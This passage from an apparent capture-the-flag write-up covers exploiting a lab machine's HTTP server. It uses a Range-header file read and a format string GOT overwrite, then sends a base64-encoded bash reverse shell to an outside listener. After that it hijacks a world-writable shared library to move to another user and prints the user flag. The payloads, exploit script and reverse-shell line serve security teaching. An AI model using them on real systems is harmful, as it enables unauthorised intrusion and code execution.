Glibc library and loader, but the server is not showing any response body when requesting /proc/self/maps:\n$ curl 10.10.10.148:9999//proc/self/maps -vso - * Trying 10.10.10.148:9999... * Connected to 10.10.10.148 (10.10.10.148) port 9999 (#0) \u0026gt; GET //proc/self/maps HTTP/1.1 \u0026gt; Host: 10.10.10.148:9999 \u0026gt; User-Agent: curl/7.84.0 \u0026gt; Accept: */* \u0026gt; * Mark bundle as not supporting multiuse \u0026lt; HTTP/1.1 200 OK \u0026lt; Accept-Ranges: bytes \u0026lt; Cache-Control: no-cache \u0026lt; Content-length: 0 \u0026lt; Content-type: text/plain \u0026lt; * Connection #0 to host 10.10.10.148 left intact  Let\u0026rsquo;s take a look at parse_request:\nvoidparse_request(undefined4 param_1, intparam_2) { size_tsVar1; intin_GS_OFFSET; char*local_1028; intlocal_1024; undefined local_101c[1036]; charlocal_c10; charlocal_c0f; charlocal_c0e; charlocal_810[1024]; charlocal_410; characStack1039[1023]; intlocal_10;  local_10 =*(int*) (in_GS_OFFSET +0x14); *(undefined4 *) (param_2 +0x800) =0; *(undefined4 *) (param_2 +0x804) =0; rio_readinitb(local_101c, param_1); rio_readlineb(local_101c, \u0026amp;local_c10, 0x400); __isoc99_sscanf(\u0026amp;local_c10, \"%s%s\", local_810, \u0026amp;local_410); while((local_c10 !='\\n'\u0026amp;\u0026amp;(local_c0f !='\\n'))) { rio_readlineb(local_101c, \u0026amp;local_c10, 0x400); if((local_c10 =='R') \u0026amp;\u0026amp;((local_c0f =='a'\u0026amp;\u0026amp;(local_c0e =='n')))) { __isoc99_sscanf(\u0026amp;local_c10, \"Range: bytes=%lu-%lu\", param_2 +0x800, param_2 +0x804); if(*(int*) (param_2 +0x804) !=0) { *(int*) (param_2 +0x804) =*(int*) (param_2 +0x804) +1; } } } local_1028 =\u0026amp;local_410; if(local_410 =='/') { local_1028 =acStack1039; sVar1 =strlen(local_1028); if(sVar1 ==0) { local_1028 =\"./index.html\"; } else{ for(local_1024 =0; local_1024 \u0026lt;(int) sVar1; local_1024 =local_1024 +1) { if(local_1028[local_1024] =='?') { local_1028[local_1024] ='\\0'; break; } } } } strcpy((char*) (param_2 +0x400), local_810); url_decode(local_1028, param_2, 0x400); if(local_10 !=*(int*) (in_GS_OFFSET +0x14)) { __stack_chk_fail_local(); } return; }  There is a place where the program checks the existence of the Range header. This header can be used to specify to the server the amount of bytes we want to retrieve. Let\u0026rsquo;s try it:\n$ curl 10.10.10.148:9999//proc/self/maps -H 'Range: bytes=0-1000000' 565ab000-565ac000 r--p 00000000 08:02 46784 /opt/www/httpserver 565ac000-565ae000 r-xp 00001000 08:02 46784 /opt/www/httpserver 565ae000-565af000 r--p 00003000 08:02 46784 /opt/www/httpserver 565af000-565b0000 r--p 00003000 08:02 46784 /opt/www/httpserver 565b0000-565b1000 rw-p 00004000 08:02 46784 /opt/www/httpserver 57c42000-57c64000 rw-p 00000000 00:00 0 [heap] f7dad000-f7f7f000 r-xp 00000000 08:02 46904 /lib32/libc-2.27.so f7f7f000-f7f80000 ---p 001d2000 08:02 46904 /lib32/libc-2.27.so f7f80000-f7f82000 r--p 001d2000 08:02 46904 /lib32/libc-2.27.so f7f82000-f7f83000 rw-p 001d4000 08:02 46904 /lib32/libc-2.27.so f7f83000-f7f86000 rw-p 00000000 00:00 0 f7f8f000-f7f91000 rw-p 00000000 00:00 0 f7f91000-f7f94000 r--p 00000000 00:00 0 [vvar] f7f94000-f7f96000 r-xp 00000000 00:00 0 [vdso] f7f96000-f7fbc000 r-xp 00000000 08:02 46900 /lib32/ld-2.27.so f7fbc000-f7fbd000 r--p 00025000 08:02 46900 /lib32/ld-2.27.so f7fbd000-f7fbe000 rw-p 00026000 08:02 46900 /lib32/ld-2.27.so ffea8000-ffec9000 rw-p 00000000 00:00 0 [stack] curl: (18) transfer closed with 998488 bytes remaining to read  Great, we have successfully retrieved the file. Moreover, we can apply the same header to read /proc/self/cmdline and /proc/self/environ:\n$ curl 10.10.10.148:9999//proc/self/cmdline -H 'Range: bytes=0-1000000' -so - ./httpserver $ curl 10.10.10.148:9999//proc/self/environ -H 'Range: bytes=0-1000000' -so - | tr '\\0' '\\n' LANG=en_US.UTF-8 SUDO_GID=0 USERNAME=john SUDO_COMMAND=/opt/www/run.sh USER=john PWD=/opt/www HOME=/root SUDO_USER=root SUDO_UID=0 MAIL=/var/mail/john TERM=unknown SHELL=/bin/bash SHLVL=1 LOGNAME=john PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin OLDPWD=/root _=./httpserver  The file /proc/self/maps will be useful for the Format String exploitation, because we have the base addresses of the binary and Glibc. In fact, the binary is protected with NX, PIE and canary:\n$ checksec httpserver [*] './httpserver' Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled  Hence, to compute function addresses at runtime, we will need to use a base address and the corresponding offset (both for the binary and for Glibc), because ASLR is enabled in the machine (there\u0026rsquo;s a 2 at /proc/sys/kernel/randomize_va_space):\n$ curl 10.10.10.148:9999//proc/sys/kernel/randomize_va_space -H 'Range: bytes=0-1000000' -so - 2  Format String exploitation Let\u0026rsquo;s run the binary locally:\n$ ./httpserver listen on port 9999, fd is 3  Now we can trigger the Format String vulnerability (notice that %x must be URL encoded to %25x):\n$ curl 127.0.0.1:9999 File not found $ curl 127.0.0.1:9999/%25x.%25x.%25x.%25x File not found  And in fact the payload works, we see some hexadecimal values (%x is a format string specifier that shows a value as a hexadecimal number), which are values leaked from the stack:\n$ ./httpserver listen on port 9999, fd is 3 accept request, fd is 4, pid is 67081 127.0.0.1:34232 404 - ./index.html request method: GET accept request, fd is 4, pid is 67139 127.0.0.1:34236 404 - f7f8f0dc.85bc.194.ffca3898 request method: GET  In order to exploit a Format String vulnerability like this one, we must get the position in the stack where our payload is being stored (yes, the payload we provide to the binary is stored in the stack as well):\n$ curl 127.0.0.1:9999/$(python3 -c 'print(\"%25x.\" * 100)') File not found  $ ./httpserver listen on port 9999, fd is 3 ... accept request, fd is 4, pid is 78524 127.0.0.1:34254 404 - f7f8f0dc.85ce.194.ffca3898.ffca3084.ffca38dc.194.ffca3898.f7facad4.2e.91acc300.56659000.f7f74000.ffca3898.566566e3.194.ffca38dc.ffca3084.56657401.ffca3054.ffca3050.ffca38dc.4.f7fc2000.f7f965d0.194.0.ffffffff.56657401.ffca3050.42dedaf.ffca30e4.f7f8e3e0.f7f8e760.1.0.1.f7f76098.f7f74000.5712f008.f7e85ea0.5712f000.f7e85f58.57130000.85bdb5ef.f7f8e2d0.ffca30e4.f7d9bd81.f7fa16bd.f7d901fc.f7f74740.1000.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e. request method: GET  If we count the dots, we will see that our payload appears at position 53. Let\u0026rsquo;s verify it using %53$x (encoded as %2553%24x):\n$ curl 127.0.0.1:9999/%2553%24x File not found $ curl 127.0.0.1:9999/ABCD%2553%24x File not found  $ ./httpserver listen on port 9999, fd is 3 ... accept request, fd is 4, pid is 82102 127.0.0.1:34264 404 - 24333525 request method: GET accept request, fd is 4, pid is 82381 127.0.0.1:34268 404 - ABCD44434241 request method: GET  As it can be seen, if we send %53$x we receive 24333525, which is %53$ in hexadecimal format (little-endian). And if we prepend ABCD to the format string, we see ABCD plus 44434241 (which is indeed ABCD in hexadecimal format, as little-endian).\nFormat String vulnerabilities not only allow to leak arbitrary values from the stack, they also allow to write arbitrary data using %n. The way %n works is by writing the number of bytes printed until the format string (%n) into the address that is referenced. For instance, entering 1234%5$n in printf will write 4 into the address at the fifth position on the stack.\nSince we have control over the stack from position 53, we can add an arbitrary address right there and write arbitrary data into that address using %53$n. Moreover, if we wanted to print a large amount of bytes, we can abuse yet another format string, which is %c. By using %1234c we will print 1234 whitespace characters (instead of sending that amount of characters).\nSo, what is the exploit strategy? Since the binary has Partial RELRO, that means that we can modify the Global Offset Table (GOT). This table contains the addresses of external functions at runtime (if they have been used at least once, otherwise, they point to another address to perform the resolution process).\nThe idea is to modify the address of a function inside Glibc and point it to system. The best functions for this approach are the ones that receive a string as the first parameter (for example, printf, strlen or puts), because then we can enter directly a string holding a shell command and it will be executed by system.\nLet\u0026rsquo;s run the binary in GDB to debug a bit. Since it is a forking server, we must use the following configurations:\n$ gdb -q httpserver Reading symbols from httpserver... (No debugging symbols found in httpserver) gef➤ set follow-fork-mode child gef➤ set detach-on-fork off gef➤ run Starting program: ./httpserver listen on port 9999, fd is 3 ^C Program received signal SIGINT, Interrupt. 0xf7fcf549 in __kernel_vsyscall ()  gef➤ got GOT protection: Partial RelRO | GOT functions: 43 [0x5655a00c] setsockopt@GLIBC_2.0 → 0xf7ecb570 [0x5655a010] strcmp@GLIBC_2.0 → 0x56556046 [0x5655a014] read@GLIBC_2.0 → 0x56556056 [0x5655a018] printf@GLIBC_2.0 → 0xf7e16d30 [0x5655a01c] memcpy@GLIBC_2.0 → 0x56556076 [0x5655a020] inet_ntoa@GLIBC_2.0 → 0x56556086 ... [0x5655a040] strcpy@GLIBC_2.0 → 0x56556106 [0x5655a044] getpid@GLIBC_2.0 → 0x56556116 [0x5655a048] puts@GLIBC_2.0 → 0x56556126 [0x5655a04c] __fxstat@GLIBC_2.0 → 0x56556136 ... [0x5655a068] getcwd@GLIBC_2.0 → 0xf7eb83a0 [0x5655a06c] strlen@GLIBC_2.0 → 0x565561b6 [0x5655a070] __libc_start_main@GLIBC_2.0 → 0xf7de1de0 [0x5655a074] write@GLIBC_2.0 → 0x565561d6 [0x5655a078] bind@GLIBC_2.0 → 0xf7ecaf30 [0x5655a07c] __isoc99_sscanf@GLIBC_2.7 → 0x565561f6 ... [0x5655a0a8] atoi@GLIBC_2.0 → 0x565562a6 [0x5655a0ac] socket@GLIBC_2.0 → 0xf7ecb660 [0x5655a0b0] close@GLIBC_2.0 → 0x565562c6 [0x5655a0b4] closedir@GLIBC_2.0 → 0x565562d6 gef➤ p system $1 = {\u0026lt;text variable, no debug info\u0026gt;} 0xf7e08360 \u0026lt;system\u0026gt; gef➤ continue Continuing.  As it can be seen, puts entry appears at 0x5655a048 (it does not have a real address because it has not been called yet), and system is at 0xf7e08360. Let\u0026rsquo;s start by overwriting the whole address of puts by 0xff (255). For that, we can use this payload: \u0026quot;%255c%56$n--\\x48\\xa0\\x55\\x56\u0026quot;. Notice that in the stack, this payload will be placed in words of 4 bytes (32 bits):\n$ echo -ne '%255c%56$n--\\x48\\xa0\\x55\\x56' | xxd -c 4 -g 4 00000000: 25323535 %255 00000004: 63253536 c%56 00000008: 246e2d2d $n-- 0000000c: 48a05556 H.UV  Also notice that the -- is just to pad the payload so that the address fills correctly in a stack position (specifically, 56). Before checking it, we must set a breakpoint after the vulnerable printf instruction:\n^C Program received signal SIGINT, Interrupt. 0xf7fcf549 in __kernel_vsyscall ()  gef➤ disassemble log_access Dump of assembler code for function log_access: 0x56557077 \u0026lt;+0\u0026gt;: push ebp 0x56557078 \u0026lt;+1\u0026gt;: mov ebp,esp 0x5655707a \u0026lt;+3\u0026gt;: push esi 0x5655707b \u0026lt;+4\u0026gt;: push ebx 0x5655707c \u0026lt;+5\u0026gt;: sub esp,0x20 ... 0x565570e5 \u0026lt;+110\u0026gt;: mov eax,DWORD PTR [ebp-0x24] 0x565570e8 \u0026lt;+113\u0026gt;: sub esp,0xc 0x565570eb \u0026lt;+116\u0026gt;: push eax 0x565570ec \u0026lt;+117\u0026gt;: call 0x56556060 \u0026lt;printf@plt\u0026gt; 0x565570f1 \u0026lt;+122\u0026gt;: add esp,0x10 0x565570f4 \u0026lt;+125\u0026gt;: sub esp,0xc 0x565570f7 \u0026lt;+128\u0026gt;: lea eax,[ebx-0x1e1e] 0x565570fd \u0026lt;+134\u0026gt;: push eax 0x565570fe \u0026lt;+135\u0026gt;: call 0x56556120 \u0026lt;puts@plt\u0026gt; 0x56557103 \u0026lt;+140\u0026gt;: add esp,0x10 0x56557106 \u0026lt;+143\u0026gt;: sub esp,0xc 0x56557109 \u0026lt;+146\u0026gt;: lea eax,[ebx-0x1d50] 0x5655710f \u0026lt;+152\u0026gt;: push eax 0x56557110 \u0026lt;+153\u0026gt;: call 0x56556120 \u0026lt;puts@plt\u0026gt; ... End of assembler dump. gef➤ break *log_access+122 Breakpoint 1 at 0x565570f1 gef➤ continue Continuing.  We also need to URL encode all data:\n$ curl 127.0.0.1:9999/%25255c%2556%24n--%48%a0%55%56 File not found  And at this point, the GOT entry for puts should be changed to 0xff:\ngef➤ got GOT protection: Partial RelRO | GOT functions: 43 ... [0x5655a048] puts@GLIBC_2.0 → 0xff [0x5655a04c] __fxstat@GLIBC_2.0 → 0x56556136 [0x5655a050] sendfile@GLIBC_2.1 → 0x56556146 [0x5655a054] exit@GLIBC_2.0 → 0x56556156 [0x5655a058] open@GLIBC_2.0 → 0xf7eb7120 ... gef➤ continue Continuing.  And there we have it. However, we need to enter a much bigger number in order to set the address of system. To accomplish this, we can use %hhn to write to a single byte.\nLet\u0026rsquo;s do this by hand: the address of system is at 0xf7e08360, so the first byte must be overwritten with 0x60 (96 in decimal), the second with 0x83 (131 in decimal), the third one with 0xe0 (224 in decimal), and the last one with 0xf7 (247 in decimal).\nManually, the first overwrite must be with payload \u0026quot;%96c%56$hhn-\\x48\\xa0\\x55\\x56\u0026quot;. Now for the second byte, the payload will be \u0026quot;%30c%60$hhn-\\x49\\xa0\\x55\\x56\u0026quot; (notice that 30 = 131 - 96 - 4 - 1, since we have already printed 96 characters plus the 4-byte address plus the -; and also that we are writing to 0x5655a048 + 1 = 0x5655a049). The third byte will be overwritten with payload \u0026quot;%88c%64$hhn-\\x4a\\xa0\\x55\\x56\u0026quot;. And the last byte, using \u0026quot;%18c%68$hhn-\\x4b\\xa0\\x55\\x56\u0026quot;. So, this is the full payload:\n%96c%56$hhn-\\x48\\xa0\\x55\\x56%30c%60$hhn-\\x49\\xa0\\x55\\x56%88c%64$hhn-\\x4a\\xa0\\x55\\x56%18c%68$hhn-\\x4b\\xa0\\x55\\x56  Let\u0026rsquo;s try it (using URL encoding):\n$ curl 127.0.0.1:9999/%2596c%2556%24hhn-%48%a0%55%56%2530c%2560%24hhn-%49%a0%55%56%2588c%2564%24hhn-%4a%a0%55%56%2519c%2568%24hhn-%4b%a0%55%56 File not found  [Attaching after process 192000 fork to child process 192115] [New inferior 2 (process 192115)] accept request, fd is 4, pid is 192115 [Switching to process 192115] Thread 2.1 \"httpserver\" hit Breakpoint 1, 0x565570f1 in log_access ()  gef➤ p system $2 = {\u0026lt;text variable, no debug info\u0026gt;} 0xf7e08360 \u0026lt;system\u0026gt; gef➤ got GOT protection: Partial RelRO | GOT functions: 43 ... [0x5655a048] puts@GLIBC_2.0 → 0xf7e08360 [0x5655a04c] __fxstat@GLIBC_2.0 → 0x56556136 [0x5655a050] sendfile@GLIBC_2.1 → 0x56556146 [0x5655a054] exit@GLIBC_2.0 → 0x56556156 [0x5655a058] open@GLIBC_2.0 → 0xf7eb7120 ... gef➤ continue Continuing. [Attaching after process 203855 vfork to child process 206427] [New inferior 3 (process 206427)] process 206427 is executing new program: /usr/bin/dash Error in re-setting breakpoint 1: No symbol table is loaded. Use the \"file\" command. Error in re-setting breakpoint 1: No symbol \"log_access\" in current context. Error in re-setting breakpoint 1: No symbol \"log_access\" in current context. Error in re-setting breakpoint 1: No symbol \"log_access\" in current context. [Inferior 3 (process 206427) exited normally]  There we have it! Now puts will be system. Let\u0026rsquo;s recall some of the code from log_access:\nvoidlog_access(undefined4 param_1, intparam_2, char*param_3) { // ... printf(\"%s:%d%d- \", pcVar3, (uint) uVar2,param_1); printf(param_3); puts(\"\"); puts(\"request method:\"); puts(param_3 +0x400); // ... return; }  So if puts is now system, we can execute whatever we want as long as our command is placed at param_3 + 0x400. For the moment, let\u0026rsquo;s start creating an exploit script in Python:\n#!/usr/bin/env python3 frompwnimport* context.binary='httpserver' defurl_encode(url: bytes) -\u0026gt; bytes: returnb'%'+'%'.join(hex(byte)[2:] forbyteinurl).encode() defmain(): fmtstr=b'%96c%56$hhn-\\x48\\xa0\\x55\\x56%30c%60$hhn-\\x49\\xa0\\x55\\x56%88c%64$hhn-\\x4a\\xa0\\x55\\x56%18c%68$hhn-\\x4b\\xa0\\x55\\x56' payload=url_encode(fmtstr) http=remote('127.0.0.1', 9999) http.sendline(b'GET /'+payload+b' HTTP/1.1\\n') http.close() if__name__=='__main__': main()  I disabled ASLR for testing purposes. Once the binary is running (outside GDB), we trigger the exploit:\n$ python3 fmtstr_exploit.py [*] './httpserver' Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled [+] Opening connection to 127.0.0.1 on port 9999: Done [*] Closed connection to 127.0.0.1 port 9999  As expected, we are looking some errors from sh (command not found):\n$ ./httpserver listen on port 9999, fd is 3 accept request, fd is 4, pid is 261035 sh: 1: request: not found Usage: GET [-options] \u0026lt;url\u0026gt;... -m \u0026lt;method\u0026gt; use method for the request (default is 'GET') -f make request even if GET believes method is illegal -b \u0026lt;base\u0026gt; Use the specified URL as base -t \u0026lt;timeout\u0026gt; Set timeout value -i \u0026lt;time\u0026gt; Set the If-Modified-Since header on the request -c \u0026lt;conttype\u0026gt; use this content-type for POST, PUT, CHECKIN -a Use text mode for content I/O -p \u0026lt;proxyurl\u0026gt; use this as a proxy -P don't load proxy settings from environment -H \u0026lt;header\u0026gt; send this HTTP header (you can specify several) -C \u0026lt;username\u0026gt;:\u0026lt;password\u0026gt; provide credentials for basic authentication -u Display method and URL before any response -U Display request headers (implies -u) -s Display response status code -S Display response status chain (implies -u) -e Display response headers (implies -s) -E Display whole chain of headers (implies -S and -U) -d Do not display content -o \u0026lt;format\u0026gt; Process HTML content in various ways -v Show program version -h Print this message 127.0.0.1:34438 404 - -HUV -IUV -JUV X-KUV  But there\u0026rsquo;s one that\u0026rsquo;s interesting. In fact, GET is a command, and the help panel is shown when it is executed without arguments:\n$ GET Usage: GET [-options] \u0026lt;url\u0026gt;... -m \u0026lt;method\u0026gt; use method for the request (default is 'GET') -f make request even if GET believes method is illegal -b \u0026lt;base\u0026gt; Use the specified URL as base -t \u0026lt;timeout\u0026gt; Set timeout value -i \u0026lt;time\u0026gt; Set the If-Modified-Since header on the request -c \u0026lt;conttype\u0026gt; use this content-type for POST, PUT, CHECKIN -a Use text mode for content I/O -p \u0026lt;proxyurl\u0026gt; use this as a proxy -P don't load proxy settings from environment -H \u0026lt;header\u0026gt; send this HTTP header (you can specify several) -C \u0026lt;username\u0026gt;:\u0026lt;password\u0026gt; provide credentials for basic authentication -u Display method and URL before any response -U Display request headers (implies -u) -s Display response status code -S Display response status chain (implies -u) -e Display response headers (implies -s) -E Display whole chain of headers (implies -S and -U) -d Do not display content -o \u0026lt;format\u0026gt; Process HTML content in various ways -v Show program version -h Print this message  Getting RCE If we modify the exploit replacing GET by whoami, we will execute whoami:\n$ sed -i s/GET/whoami/g fmtstr_exploit.py $ python3 fmtstr_exploit.py [*] './httpserver' Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled [+] Opening connection to 127.0.0.1 on port 9999: Done [*] Closed connection to 127.0.0.1 port 9999  $ ./httpserver listen on port 9999, fd is 3 accept request, fd is 4, pid is 263141 sh: 1: request: not found rocky 127.0.0.1:34440 404 - -HUV -IUV -JUV X-KUV  Cool, isn\u0026rsquo;t it? So param_3 + 0x400 actually points to the HTTP request method. We can verify it going to the decompiled source code again:\nvoidparse_request(undefined4 param_1, intparam_2) { // ... local_10 =*(int*) (in_GS_OFFSET +0x14); *(undefined4 *) (param_2 +0x800) =0; *(undefined4 *) (param_2 +0x804) =0; rio_readinitb(local_101c, param_1); rio_readlineb(local_101c, \u0026amp;local_c10, 0x400); __isoc99_sscanf(\u0026amp;local_c10, \"%s%s\", local_810, \u0026amp;local_410); // ... strcpy((char*) (param_2 +0x400), local_810); url_decode(local_1028, param_2, 0x400); if(local_10 !=*(int*) (in_GS_OFFSET +0x14)) { __stack_chk_fail_local(); } return; }  We see that it uses sscanf (__isoc99_sscanf) to parse the request line, splitting it by a whitespace, so the first part (the HTTP method) goes to local_810. And after that, it is copied to param_2 + 0x400. This variable param_2 in parse_request is the same as param_3 for log_access.\nSo we have a way to execute commands by exploiting the Format String vulnerability. But there\u0026rsquo;s still another issue: we can\u0026rsquo;t use spaces inside the command. According to unix.stackexchange.com, we can use the environment variable ${IFS} for that. Let\u0026rsquo;s try:\n$ sed -i s/whoami/echo\\${IFS}asdf/g fmtstr_exploit.py $ python3 fmtstr_exploit.py [*] './httpserver' Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled [+] Opening connection to 127.0.0.1 on port 9999: Done [*] Closed connection to 127.0.0.1 port 9999  $ ./httpserver listen on port 9999, fd is 3 accept request, fd is 4, pid is 335175 sh: 1: request: not found asdf 127.0.0.1:34442 404 - -HUV -IUV -JUV X-KUV  Alright, it\u0026rsquo;s time to exploit the remote server. Let\u0026rsquo;s recall that we had useful information in /proc/self/maps (the base address of the binary is 0x565ab000 and the base address of Glibc is 0xf7dad000):\n$ curl 10.10.10.148:9999//proc/self/maps -H 'Range: bytes=0-1000000' 565ab000-565ac000 r--p 00000000 08:02 46784 /opt/www/httpserver 565ac000-565ae000 r-xp 00001000 08:02 46784 /opt/www/httpserver 565ae000-565af000 r--p 00003000 08:02 46784 /opt/www/httpserver 565af000-565b0000 r--p 00003000 08:02 46784 /opt/www/httpserver 565b0000-565b1000 rw-p 00004000 08:02 46784 /opt/www/httpserver 57c42000-57c64000 rw-p 00000000 00:00 0 [heap] f7dad000-f7f7f000 r-xp 00000000 08:02 46904 /lib32/libc-2.27.so f7f7f000-f7f80000 ---p 001d2000 08:02 46904 /lib32/libc-2.27.so f7f80000-f7f82000 r--p 001d2000 08:02 46904 /lib32/libc-2.27.so f7f82000-f7f83000 rw-p 001d4000 08:02 46904 /lib32/libc-2.27.so f7f83000-f7f86000 rw-p 00000000 00:00 0 f7f8f000-f7f91000 rw-p 00000000 00:00 0 f7f91000-f7f94000 r--p 00000000 00:00 0 [vvar] f7f94000-f7f96000 r-xp 00000000 00:00 0 [vdso] f7f96000-f7fbc000 r-xp 00000000 08:02 46900 /lib32/ld-2.27.so f7fbc000-f7fbd000 r--p 00025000 08:02 46900 /lib32/ld-2.27.so f7fbd000-f7fbe000 rw-p 00026000 08:02 46900 /lib32/ld-2.27.so ffea8000-ffec9000 rw-p 00000000 00:00 0 [stack] curl: (18) transfer closed with 998488 bytes remaining to read  Let\u0026rsquo;s download the remote Glibc:\n$ wget -q 10.10.10.148:9999//lib32/libc-2.27.so $ file libc-2.27.so libc-2.27.so: ELF 32-bit LSB shared object, Intel 80386, version 1 (GNU/Linux), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=63b3d43ad45e1b0f601848c65b067f9e9b40528b, for GNU/Linux 3.2.0, stripped  Once we have understood how a Format String exploit works, we can automate everything with pwntools. We will see it is extremely easy:\ndefmain(): iflen(sys.argv) ==1: log.error(f\"Usage: python3 {sys.argv[0]}'\u0026lt;command\u0026gt;'\") elf.address, glibc.address=get_base_addresses() log.success(f'ELF base address : {hex(elf.address)}') log.success(f'Glibc base address: {hex(glibc.address)}') command=sys.argv[1].replace(' ', '${IFS}').encode() payload=url_encode(fmtstr_payload(53, { elf.got.puts: glibc.sym.system })) http=remote(host, 9999) http.sendline(command+b' /'+payload+b' HTTP/1.1\\n') http.close()  The full exploit script can be found in here: fmtstr_exploit.py.\nNow, let\u0026rsquo;s get a reverse shell on the machine using nc:\n$ echo -n 'bash -i \u0026 /dev/tcp/10.10.17.44/4444 0\u00261' | base64 YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx $ python3 fmtstr_exploit.py 'echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTcuNDQvNDQ0NCAwPiYx | base64 -d | bash' [*] './httpserver' Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled [+] Opening connection to 10.10.10.148 on port 9999: Done [*] Closed connection to 10.10.10.148 port 9999 [+] ELF base address : 0x5657c000 [+] Glibc base address: 0xf7d7a000 [+] Opening connection to 10.10.10.148 on port 9999: Done [*] Closed connection to 10.10.10.148 port 9999  $ nc -nlvp 4444 Listening on 0.0.0.0 4444 Connection received on 10.10.10.148 43178 bash: cannot set terminal process group (1193): Inappropriate ioctl for device bash: no job control in this shell bash: /root/.bashrc: Permission denied john@rope:/opt/www$ script /dev/null -c bash script /dev/null -c bash Script started, file is /dev/null bash: /root/.bashrc: Permission denied john@rope:/opt/www$ ^Z zsh: suspended nc -nlvp 4444 $ stty raw -echo; fg [1] + continued nc -nlvp 4444 reset xterm john@rope:/opt/www$ export TERM=xterm john@rope:/opt/www$ export SHELL=bash john@rope:/opt/www$ stty rows 50 columns 158  Perfect, we have Remote Code Execution (RCE) as john.\nLateral movement to user r4j Basic enumeration tells us that john is allowed to run /usr/bin/readlogs as r4j using sudo:\njohn@rope:/opt/www$ sudo -l Matching Defaults entries for john on rope: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User john may run the following commands on rope: (r4j) NOPASSWD: /usr/bin/readlogs john@rope:/opt/www$ file /usr/bin/readlogs /usr/bin/readlogs: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, B uildID[sha1]=67bdf14148530fcc5c26260c3450077442e89f66, not stripped  It is an ELF binary. If we run it, we see a bunch of log messages:\njohn@rope:/opt/www$ sudo -u r4j /usr/bin/readlogs Jul 19 21:00:01 rope CRON[1726]: pam_unix(cron:session): session opened for user root by (uid=0) Jul 19 21:00:01 rope CRON[1726]: pam_unix(cron:session): session closed for user root Jul 19 21:02:01 rope CRON[1731]: pam_unix(cron:session): session opened for user root by (uid=0) Jul 19 21:02:01 rope CRON[1731]: pam_unix(cron:session): session closed for user root Jul 19 21:04:01 rope CRON[1785]: pam_unix(cron:session): session opened for user root by (uid=0) Jul 19 21:04:01 rope CRON[1785]: pam_unix(cron:session): session closed for user root Jul 19 21:06:01 rope CRON[1808]: pam_unix(cron:session): session opened for user root by (uid=0) Jul 19 21:06:01 rope CRON[1808]: pam_unix(cron:session): session closed for user root Jul 19 21:06:08 rope sudo: john : TTY=pts/0 ; PWD=/opt/www ; USER=r4j ; COMMAND=/usr/bin/readlogs Jul 19 21:06:08 rope sudo: pam_unix(sudo:session): session opened for user r4j by (uid=0)  Nothing interesting at all. If we take a look at shared libraries used by the binary, we have these ones:\njohn@rope:/opt/www$ ldd /usr/bin/readlogs linux-vdso.so.1 (0x00007ffd4f3e0000) liblog.so = /lib/x86_64-linux-gnu/liblog.so (0x00007fc8e6732000) libc.so.6 = /lib/x86_64-linux-gnu/libc.so.6 (0x00007fc8e5f28000) /lib64/ld-linux-x86-64.so.2 (0x00007fc8e651b000)  Testing them one by one, eventually we will see that liblog.so is writable by anyone:\njohn@rope:/opt/www$ ls -l /lib/x86_64-linux-gnu/liblog.so -rwxrwxrwx 1 root root 15984 Jun 19 2019 /lib/x86_64-linux-gnu/liblog.so  Library Hijacking attack Therefore, we can perform a Library Hijacking attack and inject malicious commands in that shared library, so that those commands are executed as r4j. To begin with, we can create this simple C program and compile it as a shared library:\njohn@rope:/opt/www$ cd /tmp john@rope:/tmp$ vim lib.c john@rope:/tmp$ cat lib.c #include \u0026lt;unistd.h\u0026gt; void _init() { char *argv[] = {\"/bin/sh\", 0}; execve(argv[0], \u0026argv[0], NULL); } john@rope:/tmp$ gcc -shared -fpic lib.c -o /lib/x86_64-linux-gnu/liblog.so  The idea is to hijack the program execution once the library is loaded, that\u0026rsquo;s why we define a _init function. However, we need to define a function called printlog, because it is used by the binary:\njohn@rope:/tmp$ sudo -u r4j /usr/bin/readlogs /usr/bin/readlogs: symbol lookup error: /usr/bin/readlogs: undefined symbol: printlog  So let\u0026rsquo;s change _init by printlog:\njohn@rope:/tmp$ vim lib.c john@rope:/tmp$ cat lib.c #include \u0026lt;unistd.h\u0026gt; void printlog() { char *argv[] = {\"/bin/sh\", 0}; execve(argv[0], \u0026argv[0], NULL); } john@rope:/tmp$ gcc -shared -fpic lib.c -o /lib/x86_64-linux-gnu/liblog.so  And now we have a shell as r4j:\njohn@rope:/tmp$ sudo -u r4j /usr/bin/readlogs $ whoami r4j $ bash r4j@rope:/tmp$ cd /home/r4j r4j@rope:/home/r4j$ cat user.txt e81294485fad64644230fc9397b127f8  Privilege escalation This user belongs to group adm. If we list files owned by this group, we get a suspicious one:\nr4j@rope:/tmp$ id uid=1000(r4j) gid=1000(r4j) groups=1000(r4j),4(adm) r4j@rope:/tmp$ find / -group adm 2/dev/null /opt/support /opt/support/contact /var/spool/rsyslog /var/log/unattended-upgrades /var/log/kern.log /var/log/syslog /var/log/cloud-init.log /var/log/apt/term.log /var/log/auth.log /snap/core/7270/var/log/dmesg /snap/core/7270/var/log/fsck/checkfs /snap/core/7270/var/log/fsck/checkroot /snap/core/7270/var/spool/rsyslog /snap/core/6964/var/log/dmesg /snap/core/6964/var/log/fsck/checkfs 